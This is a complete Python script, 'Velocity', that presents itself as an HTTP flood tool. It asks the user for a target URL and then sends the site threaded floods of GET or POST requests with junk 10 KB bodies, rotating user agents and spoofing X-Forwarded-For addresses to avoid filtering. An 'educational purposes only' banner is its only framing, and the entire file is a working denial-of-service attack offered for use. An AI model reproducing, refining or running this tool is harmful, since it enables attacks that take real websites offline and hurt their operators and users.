#!/usr/bin/env python3
import requests
import threading
import random
import time
import sys
import socket
import ssl
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init

init(autoreset=True)

class Velocity:
    def __init__(self):
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.running = False
        self.show_banner()

    def show_banner(self):
        print(f"""
{Fore.RED} _    __     __           _ __       
| |  / /__  / /___  _____(_) /___  __
| | / / _ \/ / __ \/ ___/ / __/ / / /
| |/ /  __/ / /_/ / /__/ / /_/ /_/ / 
|___/\___/_/\____/\___/_/\__/\__, /  
                            /____/   
{Fore.CYAN}Velocity v1.0 - Advanced HTTP Flood Tool
{Fore.RED}WARNING: For educational purposes only
{Style.RESET_ALL}""")

    def random_headers(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
        ]
        return {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Upgrade-Insecure-Requests": "1",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }

    def create_bogus_data(self, size_kb=10):
        return b"A" * (size_kb * 1024)

    def send_request(self, url, method="POST", timeout=10):
        while self.running:
            try:
                headers = self.random_headers()
                data = self.create_bogus_data()
                
                if method.upper() == "POST":
                    response = requests.post(url, headers=headers, data=data, timeout=timeout)
                else:
                    response = requests.get(url, headers=headers, timeout=timeout)
                
                self.total_requests += 1
                self.successful_requests += 1
                print(f"{Fore.GREEN}[+] Request {self.total_requests}: Status {response.status_code}")
                
            except Exception as e:
                self.total_requests += 1
                self.failed_requests += 1
                print(f"{Fore.RED}[-] Request failed: {str(e)}")

    def start_attack(self, url, threads=100, method="POST", duration=60):
        self.running = True
        start_time = time.time()
        
        print(f"\n{Fore.YELLOW}[~] Starting Velocity attack on {url}")
        print(f"{Fore.YELLOW}[~] Method: {method}, Threads: {threads}, Duration: {duration}s")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(self.send_request, url, method)
            
            while time.time() - start_time < duration and self.running:
                time.sleep(1)
                
            self.running = False
        
        self.show_stats()

    def show_stats(self):
        print(f"\n{Fore.CYAN}=== Attack Statistics ===")
        print(f"{Fore.GREEN}Successful requests: {self.successful_requests}")
        print(f"{Fore.RED}Failed requests: {self.failed_requests}")
        print(f"{Fore.YELLOW}Total requests: {self.total_requests}")
        print(f"{Fore.CYAN}========================{Style.RESET_ALL}")

def main():
    velocity = Velocity()
    
    try:
        url = input(f"{Fore.YELLOW}Enter target URL: ")
        threads = int(input(f"{Fore.YELLOW}Number of threads (default 100): ") or 100)
        method = input(f"{Fore.YELLOW}HTTP Method (GET/POST, default POST): ").upper() or "POST"
        duration = int(input(f"{Fore.YELLOW}Attack duration in seconds (default 60): ") or 60)
        
        confirm = input(f"{Fore.RED}\nConfirm attack on {url}? (y/N): ").lower()
        if confirm != 'y':
            print(f"{Fore.YELLOW}[!] Attack cancelled")
            return
            
        velocity.start_attack(url, threads, method, duration)
        
    except KeyboardInterrupt:
        velocity.running = False
        print(f"\n{Fore.RED}[!] Attack stopped by user")
        velocity.show_stats()
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}")

if __name__ == "__main__":
    main()
